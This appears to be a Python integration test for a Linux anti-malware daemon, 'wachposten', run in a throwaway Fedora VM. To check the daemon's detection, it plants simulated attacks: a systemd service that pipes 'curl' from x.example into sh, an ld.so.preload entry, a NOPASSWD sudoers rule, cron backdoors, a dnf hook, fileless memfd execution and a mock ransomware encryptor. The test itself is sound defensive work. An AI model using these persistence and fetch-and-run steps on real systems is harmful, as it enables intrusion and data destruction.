#!/usr/bin/env python3
"""Tests the root daemon in a real Fedora VM: fanotify, blocking, system persistence, rpm checks
and permissions. Needs no root on the host: QEMU with user networking, KVM and a cache folder.

Usage: test/vm.py [--keep] [--rpm]
--rpm installs target/rpm/RPMS/*/wachposten-*.rpm (packaging/build-rpm.sh) instead of binaries.
The Fedora Cloud image is downloaded once to ~/.cache/wachposten-vm (or $VM_CACHE).
"""
import glob
import hashlib
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
import urllib.request

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CACHE = os.environ.get("VM_CACHE", os.path.expanduser("~/.cache/wachposten-vm"))
CLOUD_DIR = "https://download.fedoraproject.org/pub/fedora/linux/releases/44/Cloud/x86_64/images/"
CLOUD_IMAGE = "Fedora-Cloud-Base-Generic-44-1.7.x86_64.qcow2"
SSH_PORT = int(os.environ.get("VM_SSH_PORT", "2347"))
TEST_SIGNATURE = "WACHPOSTEN-TEST-SIGNATURE-7f3a9c2e-NOT-MALWARE"

results = []


def check(name, ok, detail=""):
    results.append((name, bool(ok)))
    mark = "ok  " if ok else "FAIL"
    print(f"  [{mark}] {name}" + (f"  -- {str(detail)[-800:]}" if detail and not ok else ""), flush=True)


def cloud_image():
    os.makedirs(CACHE, exist_ok=True)
    path = f"{CACHE}/{CLOUD_IMAGE}"
    if not os.path.exists(path):
        print(f"downloading {CLOUD_IMAGE}", flush=True)
        part = f"{path}.part"
        with urllib.request.urlopen(CLOUD_DIR + CLOUD_IMAGE) as resp, open(part, "wb") as out:
            shutil.copyfileobj(resp, out)
        listing = urllib.request.urlopen(CLOUD_DIR).read().decode()
        name = re.search(r'Fedora-Cloud-44-[^"<>]*CHECKSUM', listing).group(0)
        sums = urllib.request.urlopen(CLOUD_DIR + name).read().decode()
        want = re.search(rf"SHA256 \({re.escape(CLOUD_IMAGE)}\) = (\w+)", sums).group(1)
        digest = hashlib.sha256()
        with open(part, "rb") as f:
            for chunk in iter(lambda: f.read(1 << 20), b""):
                digest.update(chunk)
        if digest.hexdigest() != want:
            os.remove(part)
            sys.exit("checksum mismatch")
        os.rename(part, path)
    return path


class VM:
    def __init__(self, work, image):
        self.work = work
        self.key = f"{work}/id"
        subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-f", self.key], check=True)
        pub = open(f"{self.key}.pub").read().strip()
        seed = f"{work}/seed"
        os.makedirs(seed)
        with open(f"{seed}/user-data", "w") as f:
            f.write("#cloud-config\n" + json.dumps({
                "users": [
                    {"name": "fedora", "groups": ["wheel"], "sudo": "ALL=(ALL) NOPASSWD:ALL",
                     "ssh_authorized_keys": [pub]},
                    {"name": "gast"},
                ],
            }))
        with open(f"{seed}/meta-data", "w") as f:
            f.write("instance-id: wachposten-test\nlocal-hostname: wachposten-test\n")
        subprocess.run(["xorrisofs", "-quiet", "-output", f"{work}/seed.iso", "-volid", "cidata",
                        "-joliet", "-rock", seed], check=True)
        disk = f"{work}/disk.qcow2"
        subprocess.run(["qemu-img", "create", "-q", "-f", "qcow2", "-F", "qcow2", "-b", image, disk, "20G"],
                       check=True)
        self.process = subprocess.Popen(
            ["qemu-system-x86_64", "-enable-kvm", "-cpu", "host", "-m", "3072", "-smp", "2",
             "-display", "none", "-serial", f"file:{work}/serial.log",
             "-drive", f"file={disk},if=virtio",
             "-drive", f"file={work}/seed.iso,media=cdrom,readonly=on",
             "-nic", f"user,model=virtio,hostfwd=tcp:127.0.0.1:{SSH_PORT}-:22"])

    def sh(self, cmd, timeout=600):
        """Run a shell script as root."""
        argv = ["ssh", "-i", self.key, "-p", str(SSH_PORT), "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null", "-o", "LogLevel=ERROR", "-o", "ConnectTimeout=5",
                "fedora@127.0.0.1", "sudo sh -s"]
        return subprocess.run(argv, input=cmd, capture_output=True, text=True, timeout=timeout)

    def as_user(self, user, cmd, timeout=120):
        quoted = cmd.replace("'", "'\\''")
        return self.sh(f"runuser -u {user} -- sh -c '{quoted}'", timeout)

    def wait(self):
        deadline = time.time() + 300
        while time.time() < deadline:
            try:
                if self.sh("true", timeout=15).returncode == 0:
                    return True
            except subprocess.TimeoutExpired:
                pass
            time.sleep(3)
        return False

    def copy(self, src, dst):
        subprocess.run(["scp", "-q", "-i", self.key, "-P", str(SSH_PORT), "-o", "StrictHostKeyChecking=no",
                        "-o", "UserKnownHostsFile=/dev/null", "-o", "LogLevel=ERROR",
                        src, f"fedora@127.0.0.1:{dst}"], check=True)

    def stop(self):
        self.process.terminate()
        self.process.wait()


def events(vm, user, all_=False):
    out = vm.as_user(user, "wachposten --system events" + (" --all --limit 200" if all_ else "")).stdout
    rows = []
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 7 and parts[0].isdigit():
            rows.append({"id": int(parts[0]), "severity": parts[3], "change": parts[4],
                         "status": parts[5], "path": parts[6]})
    return rows


def find(rows, path, status=None):
    for r in rows:
        if r["path"] == path and (status is None or r["status"] == status):
            return r
    return None


def wait_for(fn, timeout=20):
    deadline = time.time() + timeout
    while time.time() < deadline:
        value = fn()
        if value:
            return value
        time.sleep(1)
    return fn()


def main():
    keep = "--keep" in sys.argv
    use_rpm = "--rpm" in sys.argv
    rpms = sorted(glob.glob(f"{ROOT}/target/rpm/RPMS/*/wachposten-[0-9]*.rpm"))
    if use_rpm and not rpms:
        sys.exit("no RPM found; run packaging/build-rpm.sh first")
    if not use_rpm:
        print("building release binaries", flush=True)
        subprocess.run(["cargo", "build", "--release", "-q", "-p", "wachposten-daemon", "-p", "wachposten"],
                       cwd=ROOT, check=True)
    parent = os.path.expanduser("~/.cache")
    os.makedirs(parent, exist_ok=True)
    work = tempfile.mkdtemp(prefix="wachposten-vm-", dir=parent)
    vm = VM(work, cloud_image())
    try:
        print("booting", flush=True)
        if not vm.wait():
            print(open(f"{work}/serial.log", errors="replace").read()[-3000:])
            sys.exit("VM did not come up")
        if use_rpm:
            vm.copy(rpms[-1], "/tmp/wachposten.rpm")
            r = vm.sh("""set -e
dnf -y -q install /tmp/wachposten.rpm
systemctl enable --now wachposten-daemon
sleep 4
findmnt -no FSTYPE /tmp; findmnt -no FSTYPE /dev/shm
""", timeout=900)
            check("RPM installed and daemon started", r.returncode == 0, r.stdout[-500:] + r.stderr[-500:])
            r2 = vm.sh("rpm -V wachposten && echo verified; ls /etc/xdg/autostart/wachposten-agent.desktop")
            check("RPM files verify", "verified" in r2.stdout, r2.stdout + r2.stderr)
        else:
            for name in ["wachposten-daemon", "wachposten"]:
                vm.copy(f"{ROOT}/target/release/{name}", f"/tmp/{name}")
            vm.copy(f"{ROOT}/packaging/systemd/wachposten-daemon.service", "/tmp/wachposten-daemon.service")
            # The CLI links fontconfig through Slint; the RPM pulls it in as a dependency.
            r = vm.sh("""set -e
rpm -q fontconfig >/dev/null || dnf -y -q install fontconfig
install -m755 /tmp/wachposten-daemon /tmp/wachposten /usr/local/bin/
install -m644 /tmp/wachposten-daemon.service /etc/systemd/system/
rm -f /tmp/wachposten-daemon /tmp/wachposten /tmp/wachposten-daemon.service
restorecon -R /usr/local/bin /etc/systemd/system 2>/dev/null || true
systemctl daemon-reload
systemctl enable --now wachposten-daemon
sleep 4
findmnt -no FSTYPE /tmp; findmnt -no FSTYPE /dev/shm
""")
            check("daemon installed and started", r.returncode == 0, r.stderr)
        print("   /tmp and /dev/shm:", " ".join(r.stdout.split()), flush=True)

        print("status", flush=True)
        r = vm.as_user("fedora", "wachposten --system status")
        check("status: program starts watched", "program starts: watched" in r.stdout, r.stdout + r.stderr)
        check("status: blocking on", "known malware is blocked" in r.stdout, r.stdout)
        check("unit runs hardened", "NoNewPrivileges=yes" in vm.sh("systemctl show wachposten-daemon -p NoNewPrivileges").stdout)

        # A subscriber as the non-admin user, to see pushed events.
        vm.copy(os.path.join(ROOT, "test", "subscribe.py"), "/tmp/subscribe.py")
        vm.sh("chmod 644 /tmp/subscribe.py; cp /tmp/subscribe.py /usr/local/bin/wp-subscribe.py")
        vm.sh("runuser -u gast -- sh -c 'nohup python3 /usr/local/bin/wp-subscribe.py > /var/tmp/gast-push.log 2>&1 &'")

        print("blocking known malware in /tmp", flush=True)
        r = vm.as_user("gast", f"""printf '#!/bin/sh\\necho {TEST_SIGNATURE}\\n' > /tmp/evil.sh
chmod +x /tmp/evil.sh
/tmp/evil.sh; echo "rc=$?"
""")
        check("start of known malware refused", "rc=126" in r.stdout and "rc=0" not in r.stdout,
              r.stdout + r.stderr)
        ev = wait_for(lambda: find(events(vm, "gast"), "/tmp/evil.sh", "open"))
        check("blocked start becomes an open event for its owner", ev and ev["severity"] == "malicious", ev)

        print("harmless programs", flush=True)
        r = vm.as_user("gast", """printf '#!/bin/sh\\necho hello\\n' > /tmp/hello.sh
chmod +x /tmp/hello.sh
start=$(date +%s%N); for i in $(seq 200); do /tmp/hello.sh >/dev/null; done; end=$(date +%s%N)
echo ms=$(( (end-start)/1000000 ))
/tmp/hello.sh""")
        check("harmless start runs", "hello" in r.stdout, r.stdout + r.stderr)
        ms = int(re.search(r"ms=(\d+)", r.stdout).group(1)) if "ms=" in r.stdout else -1
        print(f"   200 starts from /tmp took {ms} ms", flush=True)
        check("held-up starts stay fast (200 starts < 4 s)", 0 <= ms < 4000, ms)
        hist = wait_for(lambda: find(events(vm, "gast", all_=True), "/tmp/hello.sh"))
        check("harmless start only recorded, no question", hist and hist["status"] == "accepted", hist)

        print("suspicious program from a hidden folder", flush=True)
        vm.as_user("gast", "mkdir -p /tmp/.x && cp /usr/bin/sleep /tmp/.x/kworker && (nohup /tmp/.x/kworker 300 >/dev/null 2>&1 &)")
        ev = wait_for(lambda: find(events(vm, "gast"), "/tmp/.x/kworker", "open"))
        check("hidden kworker raises a question", ev and ev["severity"] == "suspicious", ev)
        if ev:
            r = vm.as_user("gast", f"wachposten --system remove {ev['id']}")
            check("owner may remove it", r.returncode == 0, r.stdout + r.stderr)
            r = vm.sh("pgrep -f /tmp/.x/kworker; ls /tmp/.x/kworker 2>&1")
            check("process ended and file gone", "No such file" in r.stdout and not re.search(r"^\d+$", r.stdout, re.M),
                  r.stdout)

        print("/var/tmp (watched after the fact)", flush=True)
        vm.as_user("gast", f"printf '#!/bin/sh\\n# {TEST_SIGNATURE}\\nexit 0\\n' > /var/tmp/late.sh; chmod +x /var/tmp/late.sh; /var/tmp/late.sh")
        ev = wait_for(lambda: find(events(vm, "gast"), "/var/tmp/late.sh", "open"))
        check("malware started from /var/tmp is reported", ev and ev["severity"] == "malicious", ev)

        print("system-wide persistence", flush=True)
        vm.sh("""cat > /etc/systemd/system/evil.service <<'EOF'
[Service]
ExecStart=/bin/sh -c 'curl -s http://x.example/p | sh'
[Install]
WantedBy=multi-user.target
EOF
systemctl enable evil.service""")
        unit = wait_for(lambda: find(events(vm, "fedora"), "/etc/systemd/system/evil.service", "open"))
        # The link itself looks harmless: it is only noted, but can still be removed.
        link = wait_for(lambda: find(events(vm, "fedora", all_=True),
                                     "/etc/systemd/system/multi-user.target.wants/evil.service", "noted"))
        check("new system service raises a question", unit and unit["severity"] == "suspicious", unit)
        check("enablement link is noted", link is not None, link)
        seen = find(events(vm, "gast"), "/etc/systemd/system/evil.service", "open")
        check("non-admin sees system events", seen is not None)
        if unit:
            r = vm.as_user("gast", f"wachposten --system remove {unit['id']}")
            check("non-admin may not decide", r.returncode != 0 and "only admins" in r.stderr, r.stdout + r.stderr)
            for e in [unit, link]:
                if e:
                    r = vm.as_user("fedora", f"wachposten --system remove {e['id']}")
                    check(f"admin removes {os.path.basename(os.path.dirname(e['path']))}/{os.path.basename(e['path'])}",
                          r.returncode == 0, r.stdout + r.stderr)
            r = vm.sh("ls /etc/systemd/system/evil.service /etc/systemd/system/multi-user.target.wants/evil.service 2>&1; systemctl is-enabled evil.service 2>&1")
            check("service files gone", r.stdout.count("No such file") == 2, r.stdout)
            r = vm.as_user("fedora", "wachposten --system quarantine")
            check("removed files are in the system quarantine", "evil.service" in r.stdout, r.stdout + r.stderr)

        vm.sh("echo /tmp/libx.so > /etc/ld.so.preload")
        ev = wait_for(lambda: find(events(vm, "fedora"), "/etc/ld.so.preload", "open"))
        check("ld.so.preload raises a suspicious question", ev and ev["severity"] == "suspicious", ev)
        if ev:
            vm.as_user("fedora", f"wachposten --system remove {ev['id']}")
            check("ld.so.preload removed", "No such file" in vm.sh("ls /etc/ld.so.preload 2>&1").stdout)

        vm.sh("printf 'gast ALL=(ALL) NOPASSWD: ALL\\n' > /etc/sudoers.d/90-gast; chmod 440 /etc/sudoers.d/90-gast")
        ev = wait_for(lambda: find(events(vm, "fedora"), "/etc/sudoers.d/90-gast", "open"))
        check("new sudoers rule raises a question", ev is not None, ev)
        if ev:
            r = vm.as_user("fedora", f"wachposten --system allow {ev['id']}")
            check("admin allows it", r.returncode == 0, r.stdout + r.stderr)

        print("user crontab in the spool (owner kept on restore)", flush=True)
        r = vm.sh("rpm -q cronie >/dev/null || dnf -y -q install cronie", timeout=900)
        print("   cronie:", "installed" if r.returncode == 0 else r.stdout[-200:] + r.stderr[-200:], flush=True)
        r = vm.as_user("gast", "echo '* * * * * /dev/shm/.k' | crontab -")
        check("crontab written as gast", r.returncode == 0, r.stdout + r.stderr)
        ev = wait_for(lambda: find(events(vm, "fedora"), "/var/spool/cron/gast", "open"))
        check("crontab of another user is seen", ev and ev["severity"] == "suspicious", ev)
        if ev:
            vm.as_user("fedora", f"wachposten --system remove {ev['id']}")
            q = vm.as_user("fedora", "wachposten --system quarantine").stdout
            qid = next((l.split()[0] for l in q.splitlines() if "/var/spool/cron/gast" in l), None)
            if qid:
                r = vm.as_user("fedora", f"wachposten --system restore {qid}")
                st = vm.sh("stat -c '%U %a' /var/spool/cron/gast").stdout.strip()
                check("restored crontab keeps its owner", r.returncode == 0 and st == "gast 600", f"{st} {r.stderr}")

        print("eBPF: scripts, memory programs, writers", flush=True)
        r = vm.as_user("fedora", "wachposten --system status")
        check("status: eBPF on", "scripts, memory programs and writers watched" in r.stdout, r.stdout + r.stderr)
        vm.as_user("gast", "mkdir -p /tmp/.y && printf 'echo hi\\n' > /tmp/.y/inst.sh && sh /tmp/.y/inst.sh")
        ev = wait_for(lambda: find(events(vm, "gast"), "/tmp/.y/inst.sh", "open"))
        check("script run through sh from a hidden folder raises a question", ev and ev["severity"] == "suspicious", ev)
        if ev:
            r = vm.as_user("gast", f"wachposten --system show {ev['id']}")
            check("the event names the interpreter", "Through interpreter: sh" in r.stdout, r.stdout)
        vm.as_user("gast", f"printf 'print(\"{TEST_SIGNATURE}\")\\n' > /tmp/evil.py && python3 /tmp/evil.py")
        ev = wait_for(lambda: find(events(vm, "gast"), "/tmp/evil.py", "open"))
        check("malicious python script is reported", ev and ev["severity"] == "malicious", ev)
        vm.as_user("gast", """nohup python3 -c 'import os; fd=os.memfd_create("kw"); os.write(fd, open("/usr/bin/sleep","rb").read()); os.execv("/proc/self/fd/%d" % fd, ["kw", "300"])' >/dev/null 2>&1 &""")
        mem = wait_for(lambda: next((e for e in events(vm, "gast")
                                     if re.match(r"/proc/\d+/exe$", e["path"]) and e["status"] == "open"), None))
        check("program started from memory raises a question", mem and mem["severity"] == "suspicious", mem)
        if mem:
            pid = re.match(r"/proc/(\d+)/exe", mem["path"]).group(1)
            r = vm.as_user("gast", f"wachposten --system remove {mem['id']}")
            alive = vm.sh(f"kill -0 {pid} 2>/dev/null && echo alive || echo gone").stdout.strip()
            check("removing it ends the process", r.returncode == 0 and alive == "gone", r.stdout + r.stderr + alive)

        vm.sh("""python3 -c "open('/etc/cron.d/backdoor','w').write('* * * * * root /tmp/x\\n')" """)
        ev = wait_for(lambda: find(events(vm, "fedora"), "/etc/cron.d/backdoor", "open"))
        check("cron.d entry raises a question", ev is not None, ev)
        if ev:
            r = vm.as_user("fedora", f"wachposten --system show {ev['id']}")
            check("the event names the writing program", "changed by: python3" in r.stdout, r.stdout)
        vm.sh("mkdir -p /etc/dnf/libdnf5-plugins/actions.d && printf 'post_transaction:::/bin/sh /tmp/.p/run\\n' > /etc/dnf/libdnf5-plugins/actions.d/x.actions")
        ev = wait_for(lambda: find(events(vm, "fedora"), "/etc/dnf/libdnf5-plugins/actions.d/x.actions", "open"))
        check("package manager hook running from /tmp raises a question", ev and ev["severity"] == "suspicious", ev)
        if ev:
            vm.as_user("fedora", f"wachposten --system remove {ev['id']}")
        vm.as_user("gast", """mkdir -p ~/.config/autostart && python3 -c "import os; open(os.path.expanduser('~/.config/autostart/x.desktop'),'w').write('[Desktop Entry]\\n')" """)
        time.sleep(2)
        who = """import json,socket,sys
s=socket.socket(socket.AF_UNIX); s.connect("/run/wachposten/daemon.sock")
s.sendall((json.dumps({"request":"who-wrote","paths":sys.argv[1:]})+"\\n").encode())
print(s.makefile().readline())"""
        vm.sh(f"cat > /usr/local/bin/wp-who.py <<'EOF'\n{who}\nEOF\nchmod 755 /usr/local/bin/wp-who.py")
        r = vm.as_user("gast", "python3 /usr/local/bin/wp-who.py /home/gast/.config/autostart/x.desktop /etc/cron.d/backdoor")
        try:
            writers = json.loads(r.stdout)["writers"]
        except (ValueError, KeyError):
            writers = []
        check("agent may ask who wrote its own files", len(writers) == 2 and writers[0] and "python3" in writers[0],
              r.stdout + r.stderr)
        check("but not about system files", len(writers) == 2 and writers[1] is None, r.stdout)

        print("ransomware", flush=True)
        r = vm.as_user("fedora", "wachposten --system status")
        check("status: ransomware check on", "watched, such programs are stopped" in r.stdout, r.stdout + r.stderr)
        files = """import os
d = os.path.expanduser("~/Dokumente")
os.makedirs(d, exist_ok=True)
os.makedirs(os.path.expanduser("~/Bilder"), exist_ok=True)
for i in range(100):
    open(f"{d}/brief{i:03}.txt", "w").write(("Liebe Anna, viele Gruesse. " * 60) + "\\n")
    open(f"{d}/rechnung{i:03}.pdf", "wb").write(b"%PDF-1.7\\n" + b"1 0 obj << >> endobj\\n" * 100)
"""
        harmless = """import os
e = os.path.expanduser("~/Bilder/export")
os.makedirs(e, exist_ok=True)
for i in range(100):
    open(f"{e}/foto{i:03}.jpg", "wb").write(b"\\xff\\xd8\\xff\\xe0" + os.urandom(8000))
d = os.path.expanduser("~/Kopie")
for n in sorted(os.listdir(d))[:60]:
    if n.endswith(".txt"):
        open(os.path.join(d, n), "w").write("Neuer Text. " * 100)
"""
        encrypt = """import os, time
d = os.path.expanduser("~/Dokumente")
for n in sorted(os.listdir(d)):
    p = os.path.join(d, n)
    data = open(p, "rb").read()
    with open(p + ".locked", "wb") as f:
        f.write(os.urandom(max(len(data), 1024)))
    os.unlink(p)
    time.sleep(0.02)
time.sleep(300)
"""
        for name, text in [("mkfiles.py", files), ("harmless.py", harmless), ("enc.py", encrypt)]:
            vm.sh(f"cat > /home/gast/{name} <<'EOF'\n{text}EOF\nchown gast: /home/gast/{name}")
        vm.as_user("gast", "python3 ~/mkfiles.py")
        r = vm.as_user("gast", """set -e
cp -r ~/Dokumente ~/Kopie
tar cf ~/a.tar -C ~ Dokumente && mkdir -p ~/Entpackt && tar xf ~/a.tar -C ~/Entpackt
for f in ~/Entpackt/Dokumente/*.txt; do mv "$f" "$f.bak"; done
python3 ~/harmless.py""", timeout=300)
        check("harmless mass changes ran", r.returncode == 0, r.stdout + r.stderr)
        time.sleep(3)
        r = vm.sh("journalctl -u wachposten-daemon --no-pager | grep 'ransomware check' || true")
        check("copying, unpacking, renaming and exporting raise no alarm", r.stdout.strip() == "", r.stdout[-800:])

        vm.as_user("gast", "nohup python3 ~/enc.py >/dev/null 2>&1 &")
        ev = wait_for(lambda: find(events(vm, "gast"), "/home/gast/enc.py", "open"), timeout=40)
        check("encrypting script raises a question", ev and ev["severity"] == "malicious", ev)
        pid = vm.sh("pgrep -f 'python3 /home/gast/enc.py' | head -1").stdout.strip()
        state = vm.sh(f"awk '{{print $3}}' /proc/{pid}/stat 2>/dev/null").stdout.strip() if pid else ""
        check("and it is stopped", state == "T", f"pid {pid!r} state {state!r}")
        time.sleep(2)
        locked = vm.as_user("gast", "ls ~/Dokumente | grep -c '\\.locked$' || true").stdout.strip()
        check("fewer than 40 files were encrypted", locked.isdigit() and int(locked) < 40, locked)
        if ev:
            r = vm.as_user("gast", f"wachposten --system show {ev['id']}")
            check("the event names the reason", "look encrypted" in r.stdout or "renamed to" in r.stdout, r.stdout)
            r = vm.as_user("gast", f"wachposten --system remove {ev['id']}")
            gone = vm.sh(f"kill -0 {pid} 2>/dev/null && echo alive || echo gone").stdout.strip() if pid else "gone"
            check("End it kills the process and quarantines the script",
                  r.returncode == 0 and gone == "gone" and vm.sh("test -e /home/gast/enc.py").returncode != 0,
                  r.stdout + r.stderr + gone)

        vm.as_user("gast", "ln ~/Kopie/rechnung000.pdf ~/Bilder/'!wachposten-koeder.docx'")
        vm.as_user("gast", """nohup python3 -c 'import time; f = open("/home/gast/Bilder/!wachposten-koeder.docx", "r+b"); f.write(b"X"); f.close(); time.sleep(300)' >/dev/null 2>&1 &""")
        dec = wait_for(lambda: next((e for e in events(vm, "gast")
                                     if re.match(r"/proc/\d+/exe$", e["path"]) and e["status"] == "open"
                                     and e["severity"] == "malicious"), None))
        check("changing a decoy file raises a question at once", dec is not None, dec)
        if dec:
            dpid = re.match(r"/proc/(\d+)/exe", dec["path"]).group(1)
            state = vm.sh(f"awk '{{print $3}}' /proc/{dpid}/stat").stdout.strip()
            check("the decoy changer is stopped", state == "T", state)
            r = vm.as_user("gast", f"wachposten --system allow {dec['id']}")
            time.sleep(1)
            state = vm.sh(f"awk '{{print $3}}' /proc/{dpid}/stat").stdout.strip()
            check("Let it run continues it", r.returncode == 0 and state in ("S", "R"), r.stdout + r.stderr + state)
            r = vm.as_user("fedora", """python3 -c 'import json,socket; s=socket.socket(socket.AF_UNIX); s.connect("/run/wachposten/daemon.sock"); s.sendall(b"{\\"request\\":\\"allowlist\\"}\\n"); print(s.makefile().readline())'""")
            check("the interpreter is not allowed as a whole",
                  '"reply":"allowlist"' in r.stdout.replace(" ", "") and "python3" not in r.stdout, r.stdout + r.stderr)
            vm.sh(f"kill {dpid}")

        # Load: many small writes in a home folder go through the ransomware check.
        dpid = vm.sh("systemctl show -p MainPID --value wachposten-daemon").stdout.strip()
        cpu = lambda: sum(int(x) for x in vm.sh(f"awk '{{print $14, $15}}' /proc/{dpid}/stat").stdout.split())
        before, t0 = cpu(), time.time()
        r = vm.as_user("gast", """python3 -c '
import os
d = os.path.expanduser("~/last")
os.makedirs(d, exist_ok=True)
for i in range(20000):
    open(f"{d}/n{i}.txt", "w").write("Zeile\\n" * 20)
for i in range(0, 20000, 2):
    open(f"{d}/n{i}.txt", "w").write("neu\\n" * 20)
print(20000)' && rm -rf ~/last""", timeout=600)
        time.sleep(3)  # let the daemon drain its queue
        wall = time.time() - t0
        used = (cpu() - before) / os.sysconf("SC_CLK_TCK")
        print(f"   load: {r.stdout.split()[0] if r.stdout.split() else '?'} files written, half rewritten and deleted in {wall:.1f} s, "
              f"daemon used {used:.1f} s CPU", flush=True)
        check("daemon keeps up with many writes (under half a CPU)", r.returncode == 0 and used < wall * 0.5,
              f"{used:.1f} s CPU in {wall:.1f} s")
        r = vm.sh("journalctl -u wachposten-daemon --no-pager | grep 'ransomware check' | grep -vE 'enc.py|koeder|look encrypted|renamed to' || true")
        alarms = vm.sh("journalctl -u wachposten-daemon --no-pager | grep -c 'ransomware check: process' || true").stdout.strip()
        check("the copy raised no alarm (only the attack and the decoy did)", alarms == "2", alarms + r.stdout[-500:])

        print("package changes are not questioned", flush=True)
        r = vm.sh("dnf -y -q install --allowerasing vim-default-editor 2>&1 | tail -3; ls /etc/profile.d/ | grep -i editor",
                  timeout=900)
        if "vim-default-editor" in r.stdout:
            time.sleep(15)
            rows = events(vm, "fedora", all_=True)
            ev = find(rows, "/etc/profile.d/vim-default-editor.sh")
            check("file installed by dnf is accepted without a question",
                  ev and ev["status"] == "accepted", ev)
            check("no open questions after the install",
                  not [e for e in events(vm, "fedora") if e["path"].startswith("/etc/profile.d/")])
        else:
            print("   (skipped: dnf install failed)", r.stdout[-300:], flush=True)

        log = vm.sh("cat /var/tmp/gast-push.log").stdout
        check("subscribed non-admin agent got pushes", "evil.sh" in log and "evil.service" in log, log[-500:])
        check("non-admin push for system events has no decision right",
              '"can_decide": false' in log or '"can_decide":false' in log, log[-500:])

        r = vm.sh("systemctl is-active wachposten-daemon; journalctl -u wachposten-daemon --no-pager | grep -ciE 'panic|error' || true")
        check("daemon still running, no errors in its log", r.stdout.split()[0] == "active" and r.stdout.split()[-1] == "0",
              vm.sh("journalctl -u wachposten-daemon --no-pager | grep -iE 'panic|error' | tail -5").stdout)
    finally:
        if keep:
            print(f"VM kept running; ssh -i {work}/id -p {SSH_PORT} fedora@127.0.0.1", flush=True)
        else:
            vm.stop()
            shutil.rmtree(work, ignore_errors=True)

    failed = [n for n, ok in results if not ok]
    print(f"\n{len(results) - len(failed)}/{len(results)} checks passed")
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
